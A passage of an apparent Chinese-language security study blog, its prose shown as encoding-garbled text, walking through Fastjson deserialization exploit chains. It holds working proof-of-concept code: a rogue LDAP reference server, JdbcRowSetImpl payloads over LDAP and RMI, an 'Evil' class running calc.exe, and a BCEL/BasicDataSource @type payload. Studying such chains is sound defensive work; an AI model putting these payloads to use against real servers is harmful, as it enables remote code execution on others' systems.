</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;  </span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));  </span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();  </span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);  </span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);  </span><br><span class="line">            &#125;  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  </span><br><span class="line">            result.sendSearchEntry(e);  </span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”»å‡»çš„expï¼Œå› ä¸ºæ˜¯è‡ªå·±æœ¬åœ°èµ·çš„æœåŠ¡æ‰€ä»¥åœ¨ç«¯å£ç¨å¾®ä¸åŒï¼Œåé¢çš„remoteObjæ— æ‰€è°“ä¸ä¸ºç©ºå°±è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPOC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212138907.png" alt="image-20230821213817470"><br>è¿™é‡Œä¹Ÿå¯ä»¥çœ‹åˆ°ä¸Šé¢çš„æŠ¥é”™æ˜¯æ­£å¸¸æŠ¥é”™ï¼Œå’Œå‘½ä»¤æ‰§è¡Œæ— å…³</p><h3 id="2-JNDI-RMI"><a href="#2-JNDI-RMI" class="headerlink" title="2.JNDI+RMI"></a>2.JNDI+RMI</h3><p>RMIæ”»å‡»çš„expæŠŠåè®®æ¢ä¸€ä¸‹å°±è¡Œï¼ŒæœåŠ¡ç«¯ä¸ä¸€æ ·å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);  </span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”»å‡»çš„expï¼Œrmiè¿™é‡Œå¿…é¡»ä¸ºremoteObjï¼Œrmiè¿™å—å„¿æ²¡å­¦å¥½ï¼Œæ¥å£è¿™é‡Œæœ‰ç‚¹è¿·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// åŸºäº JdbcRowSetImpl çš„åˆ©ç”¨é“¾  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIPayload</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212138821.png" alt="image-20230821213838383"><br>åŒæ ·ä¹Ÿå¯ä»¥åˆ©ç”¨å·¥å…·marshalsecæ¥èµ·æœåŠ¡ï¼Œä½†æ˜¯æˆ‘åˆ©ç”¨å¤±è´¥äº†å°±ä¸æ¼”ç¤ºäº†</p><h2 id="åŸºäºBCELçš„åˆ©ç”¨é“¾"><a href="#åŸºäºBCELçš„åˆ©ç”¨é“¾" class="headerlink" title="åŸºäºBCELçš„åˆ©ç”¨é“¾"></a>åŸºäºBCELçš„åˆ©ç”¨é“¾</h2><p>å…ˆçœ‹ä¸‹BCELæ˜¯ä»€ä¹ˆå§ï¼Œç„¶åæŠŠtomcatçš„ä¾èµ–å¯¼è¿›æ¥åé¢ä¼šç”¨åˆ°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h3><p>BCELçš„å…¨åæ˜¯Apache Commons BCELï¼Œå±äºApache Commonsé¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ï¼ŒCCé“¾ä¹Ÿå°±æ˜¯ä»<code>Apache Commons</code>äº§ç”Ÿçš„ã€‚</p><p>BCELåº“æä¾›äº†ä¸€ç³»åˆ—ç”¨äºåˆ†æã€åˆ›å»ºã€ä¿®æ”¹Java Classæ–‡ä»¶çš„APIã€‚ä¸»è¦ç”¨æ¥å°†xmlæ–‡æ¡£è½¬ä¸ºclassæ–‡ä»¶ã€‚ç¼–è¯‘åçš„classè¢«ç§°ä¸ºtransletï¼Œå¯ä»¥åœ¨åç»­ç”¨äºå¯¹XMLæ–‡ä»¶çš„è½¬æ¢ã€‚è¯¥åº“å·²ç»å†…ç½®åœ¨äº†JDKä¸­ã€‚å…³äºBCELå…·ä½“è¯¦æƒ…å¯å‚è€ƒ<code>https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</code>ã€‚<br>è¿™é‡Œå…ˆç®€å•çœ‹ä¸‹æ€ä¹ˆåˆ©ç”¨BCELæ¥å‘½ä»¤æ‰§è¡Œ<br>BCELä¸­æœ‰ä¸€ä¸ªç±»<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>ï¼Œæ˜¯ä¸€ä¸ªClassLoaderï¼Œé‡å†™äº†<code>loadClass</code>æ–¹æ³•ã€‚åœ¨<code>ClassLoader#loadClass()</code>ä¸­ï¼Œå…¶ä¼šåˆ¤æ–­ç±»åæ˜¯å¦æ˜¯<code>$$BCEL$$</code>å¼€å¤´ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°†ä¼šå¯¹è¿™ä¸ªå­—ç¬¦ä¸²è¿›è¡Œdecodeã€‚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212139533.png" alt="image-20230821213912306"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212139099.png" alt="image-20230821213938865"><br>ç„¶åç”¨ä¸€ä¸ªå°Domeç®€å•è°ƒè¯•ä¸€ä¸‹<br>æ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•Dome</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException, InstantiationException &#123;  </span><br><span class="line">        <span class="comment">//ä½¿ç”¨BCEL(Byte Code Engineering Library)çš„Repositoryç±»çš„lookupClassæ–¹æ³•ï¼Œ  </span></span><br><span class="line">        <span class="comment">// å°è¯•ä»ç±»è·¯å¾„ä¸­æŸ¥æ‰¾åä¸º &#x27;calc.class&#x27; çš„ç±»ï¼Œå¹¶è¿”å›ä¸€ä¸ª JavaClass å¯¹è±¡ã€‚  </span></span><br><span class="line">        <span class="comment">//&#x27;JavaClass&#x27; æ˜¯ BCEL æä¾›çš„ç±»ï¼Œç”¨äºè¡¨ç¤ºå·²åŠ è½½çš„ Java ç±»ã€‚  </span></span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//ä½¿ç”¨ BCEL æä¾›çš„ &#x27;Utility&#x27; ç±»çš„ &#x27;encode&#x27; æ–¹æ³•ï¼Œå°†å­—èŠ‚ç ä½¿ç”¨base64è¿›è¡Œç¼–ç ï¼š  </span></span><br><span class="line">        <span class="comment">// &#x27;cls.getBytes()&#x27; è¿”å›è¡¨ç¤º &#x27;calc.class&#x27; å­—èŠ‚ç çš„å­—èŠ‚æ•°ç»„ï¼›trueè¡¨ç¤ºç¼–ç è¿‡ç¨‹ä¸­è¿›è¡Œåˆ†å‰²  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//åˆ›å»ºäº†ä¸€ä¸ªClassLoaderå¯¹è±¡ï¼Œè°ƒç”¨å…¶loadClassæ–¹æ³•  </span></span><br><span class="line">        <span class="comment">//loadClassæ–¹æ³•ç”¨äºåŠ è½½ç±»ï¼Œæ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°è¡¨ç¤ºè¦åŠ è½½çš„ç±»çš„åç§°  </span></span><br><span class="line">        <span class="comment">// (è¿™é‡Œçš„ç±»é€šè¿‡å°†&#x27;$$BCEL$$&#x27;å­—ç¬¦ä¸²å’Œå˜é‡&#x27;code&#x27;æ‹¼æ¥å¾—åˆ°),å†é€šè¿‡è°ƒç”¨.newInstanceæ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡  </span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span>+code).newInstance();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212140749.png" alt="image-20230821213957427"><br>ç›´æ¥çœ‹ä¸‹é¢è¿™é‡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212140268.png" alt="image-20230821214024960"><br>å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹åœ¨<code>defineClass</code>å³åŠ¨æ€ç±»åŠ è½½ï¼Œä½†è¿›å…¥è¿™é‡Œé¦–å…ˆ<code>clazz</code>ä¸èƒ½ä¸ºnullï¼Œæ­¤æ—¶å¦‚æœ<code>class_name</code>å‰å‡ ä½ä¸º<code>$$BCEL$$</code>å°±ä¼šå»æ‰§è¡Œ<code>createClass</code>åˆ›å»ºä¸€ä¸ªClasszè¿™æ ·å°±èƒ½æ¥åˆ°<code>defineClass</code>åŠ è½½åˆ°æ¶æ„ç±»è¿”å›ç±»çš„å¯¹è±¡ï¼Œåœ¨<code>newInstance()</code>çš„æ—¶å€™å°±ä¼šå‘½ä»¤æ‰§è¡Œï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯æ‰¾å“ªé‡Œèƒ½è°ƒç”¨loadClassï¼Œæœ€ç»ˆæ˜¯æ‰¾åˆ°äº†<code>BasicDataSource</code>ç±»ï¼Œåœ¨<code>createConnectionFactory()</code>æ–¹æ³•ä¸­ä¼šè°ƒç”¨ç”¨forNameå…¶å®åº•å±‚å°±æ˜¯è°ƒç”¨loadClassï¼ˆç™½æ—¥æ¢¦ç»„é•¿è¯´çš„ï¼Œå…·ä½“æ²¡è·Ÿï¼‰<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212140198.png" alt="image-20230821214040909"><br>ç„¶åå°±æ˜¯çœ‹è¿™ä¸¤ä¸ªå˜é‡å¯ä¸å¯æ§ï¼Œè®©ClassNameä¸ºæ¶æ„çš„nameï¼ŒClassLoadä¸ºä¸Šé¢Domeä¸­çš„ï¼Œåœ¨è¿™é‡Œå…¶å®æ˜¯æœ‰å¯¹åº”çš„setterå’Œgetter<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212140823.png" alt="image-20230821214059194"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212141349.png" alt="image-20230821214110741"><br>é‚£ä¹ˆè¿™ä¸¤ä¸ªå˜é‡å¯æ§ç°åœ¨çœ‹èƒ½ä¸èƒ½è°ƒç”¨åˆ°<code>createConnectionFactory()</code>æ–¹æ³•ï¼Œæ‰¾åˆ°äº†<code>createDataSource()</code>æ–¹æ³•ï¼Œç»§ç»­å¾€ä¸Šæ‰¾<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212141753.png" alt="image-20230821214124132"><br>æœ€ç»ˆåœ¨<code>getConnection()</code>ä¸­è°ƒç”¨äº†<code>createDataSource()</code>æ–¹æ³•ï¼Œä¸”ä¸ºgetteræ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212141100.png" alt="image-20230821214138477"></p><h3 id="æ„é€ exp"><a href="#æ„é€ exp" class="headerlink" title="æ„é€ exp"></a>æ„é€ exp</h3><p>å°è¯•æ„é€ ä¸€ä¸‹exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelPoc</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//ä½¿ç”¨BCEL(Byte Code Engineering Library)çš„Repositoryç±»çš„lookupClassæ–¹æ³•ï¼Œ  </span></span><br><span class="line">        <span class="comment">// å°è¯•ä»ç±»è·¯å¾„ä¸­æŸ¥æ‰¾åä¸º &#x27;calc.class&#x27; çš„ç±»ï¼Œå¹¶è¿”å›ä¸€ä¸ª JavaClass å¯¹è±¡ã€‚  </span></span><br><span class="line">        <span class="comment">//&#x27;JavaClass&#x27; æ˜¯ BCEL æä¾›çš„ç±»ï¼Œç”¨äºè¡¨ç¤ºå·²åŠ è½½çš„ Java ç±»ã€‚  </span></span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//ä½¿ç”¨ BCEL æä¾›çš„ &#x27;Utility&#x27; ç±»çš„ &#x27;encode&#x27; æ–¹æ³•ï¼Œå°†å­—èŠ‚ç ä½¿ç”¨base64è¿›è¡Œç¼–ç ï¼š  </span></span><br><span class="line">        <span class="comment">// &#x27;cls.getBytes()&#x27; è¿”å›è¡¨ç¤º &#x27;calc.class&#x27; å­—èŠ‚ç çš„å­—èŠ‚æ•°ç»„ï¼›trueè¡¨ç¤ºç¼–ç è¿‡ç¨‹ä¸­è¿›è¡Œåˆ†å‰²  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();  </span><br><span class="line">        dataSource.setDriverClassLoader(<span class="keyword">new</span> <span class="title class_">ClassLoader</span>());  </span><br><span class="line">        dataSource.setDriverClassName(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">        dataSource.getConnection();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212142301.png" alt="image-20230821214200048"><br>æˆåŠŸæ‰§è¡Œï¼Œç°åœ¨æ¢æˆ<code>@type</code>å½¢å¼çš„å°±OKäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelPoc</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//ä½¿ç”¨BCEL(Byte Code Engineering Library)çš„Repositoryç±»çš„lookupClassæ–¹æ³•ï¼Œ  </span></span><br><span class="line">        <span class="comment">// å°è¯•ä»ç±»è·¯å¾„ä¸­æŸ¥æ‰¾åä¸º &#x27;calc.class&#x27; çš„ç±»ï¼Œå¹¶è¿”å›ä¸€ä¸ª JavaClass å¯¹è±¡ã€‚  </span></span><br><span class="line">        <span class="comment">//&#x27;JavaClass&#x27; æ˜¯ BCEL æä¾›çš„ç±»ï¼Œç”¨äºè¡¨ç¤ºå·²åŠ è½½çš„ Java ç±»ã€‚  </span></span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//ä½¿ç”¨ BCEL æä¾›çš„ &#x27;Utility&#x27; ç±»çš„ &#x27;encode&#x27; æ–¹æ³•ï¼Œå°†å­—èŠ‚ç ä½¿ç”¨base64è¿›è¡Œç¼–ç ï¼š  </span></span><br><span class="line">        <span class="comment">// &#x27;cls.getBytes()&#x27; è¿”å›è¡¨ç¤º &#x27;calc.class&#x27; å­—èŠ‚ç çš„å­—èŠ‚æ•°ç»„ï¼›trueè¡¨ç¤ºç¼–ç è¿‡ç¨‹ä¸­è¿›è¡Œåˆ†å‰²  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        BasicDataSource dataSource = new BasicDataSource();  </span></span><br><span class="line"><span class="comment">//        dataSource.setDriverClassLoader(new ClassLoader());  </span></span><br><span class="line"><span class="comment">//        dataSource.setDriverClassName(&quot;$$BCEL$$&quot;+code);  </span></span><br><span class="line"><span class="comment">//        dataSource.getConnection();  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//driverClassLoaderéœ€è¦ä¼ å…¥çš„æ˜¯ClassLoaderå¯¹è±¡æ‰€ä»¥ä¹Ÿéœ€è¦ç”¨@typeå½¢å¼å¼•å…¥  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> +code +<span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åé¢ä¸€å®šè¦ç”¨<code>parseObject()</code>å»ååºåˆ—åŒ–ï¼Œå› ä¸ºæˆ‘ä»¬è¦è°ƒå®ƒçš„<code>getConnection()</code>ä¸ºgetteræ–¹æ³•éœ€è¦è¿›å…¥<code>toJSON()</code>æ–¹æ³•ä¸­<br><img 